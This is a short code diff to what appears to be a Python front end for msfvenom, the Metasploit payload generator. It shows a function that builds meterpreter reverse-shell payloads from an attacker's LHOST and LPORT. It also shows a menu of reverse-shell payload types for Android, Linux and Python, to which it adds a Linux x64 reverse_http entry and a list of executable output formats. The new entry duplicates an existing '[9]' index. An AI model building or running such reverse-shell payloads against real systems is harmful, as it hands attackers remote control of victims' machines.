@@ -96,6 +96,8 @@ def lask():
 
 def payloadgen1(payload, talkback, lhost, lport, outfile): #Not used as of now
     subprocess.run(["msfvenom", "-p", payload + "/meterpreter/reverse_" + talkback, "LHOST=" + lhost, "LPORT=" + str(lport), "-o", outfile])    
+def askformat():
+    None
 
 def payloadgen2(payloadandsession, lhost, lport, outfile, args1, args2):
     try:
@@ -398,6 +400,8 @@ pldlist.append("[6] python/shell_reverse_tcp")
 pldlist.append("[7] android/meterpreter/reverse_tcp")
 pldlist.append("[8] android/meterpreter/reverse_https")
 pldlist.append("[9] linux/x86/meterpreter/reverse_tcp")
+pldlist.append("[9] linux/x64/meterpreter/reverse_http")
+
 #========================
 #command list 
 #========================
@@ -406,6 +410,12 @@ cmdlist.append("[list] - show this page")
 cmdlist.append("[help] - show this page")
 cmdlist.append("[clear] - clear screen")
 cmdlist.append("[search] -  search for compatible payloads")
+
+#========================
+#format list 
+#========================
+formatlist = ["asp", "dll", "elf", "elf-so", "exe", "exe-only", "exe-service", "exe-small", "bin", "py", "bash", "sh"]
+
 def main():
     #there for future stuff
     time.sleep(0.1)
